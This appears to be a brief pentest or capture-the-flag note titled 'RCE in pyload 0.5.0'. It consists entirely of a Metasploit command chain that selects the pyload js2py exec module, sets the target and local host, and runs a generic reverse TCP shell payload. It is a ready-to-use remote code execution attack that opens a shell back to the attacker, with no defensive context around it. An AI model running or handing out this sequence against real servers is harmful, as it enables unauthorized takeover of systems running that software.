## RCE in pyload 0.5.0

msfconsole > linux/http/pyload_js2py_exec > set Target 2 > set rhosts <server ip> > set lhost <localhost ip> > set payload generic/shell_reverse_tcp > run